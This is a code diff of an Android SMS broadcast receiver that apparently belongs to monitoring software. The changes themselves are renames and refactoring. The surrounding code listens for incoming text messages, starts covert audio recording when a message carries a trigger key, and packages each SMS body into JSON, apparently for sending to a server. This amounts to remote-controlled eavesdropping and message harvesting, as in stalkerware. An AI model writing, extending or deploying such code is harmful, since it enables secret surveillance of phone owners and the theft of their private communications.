@@ -13,12 +13,11 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 
 import com.inet.android.audio.RecordAudio;
-import com.inet.android.certificate.R;
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * SmsSentObserver class is design for monitoring incoming sms
@@ -37,7 +36,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
 		this.mContext = context;
 		mBundle = intent.getExtras();
-		if (WhileTheMethod.getState(2, context) == 0)
+		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, context) == 0)
 			return;
 
 		try {
@@ -64,7 +63,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
 				msgs = new SmsMessage[pdus.length];
-				String startRecord = mContext.getString(R.string.start_record);
+				String startRecord = ValueWork.getKeyForRecord(mContext);
 
 				StringBuilder bodyText = new StringBuilder();
 				for (int k = 0; k < msgs.length; k++) {
@@ -81,7 +80,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 										msgs[k].getMessageBody().length())) * 60;
 						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
 								+ minute);
-						RecordAudio recordAudio = new RecordAudio(minute, 0);
+						RecordAudio recordAudio = new RecordAudio(minute, 0, mContext);
 						recordAudio.executeRecording();
 					}
 
@@ -104,7 +103,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 					info.put("data", bodyText.toString());
 
 					object.put("time", ConvertDate.logTime());
-					object.put("type", ConstantRequest.TYPE_INCOMING_SMS_REQUEST);
+					object.put("type", ConstantValue.TYPE_INCOMING_SMS_REQUEST);
 					object.put("info", info);
 					data.put(object);
 					jsonObject.put("data", data);
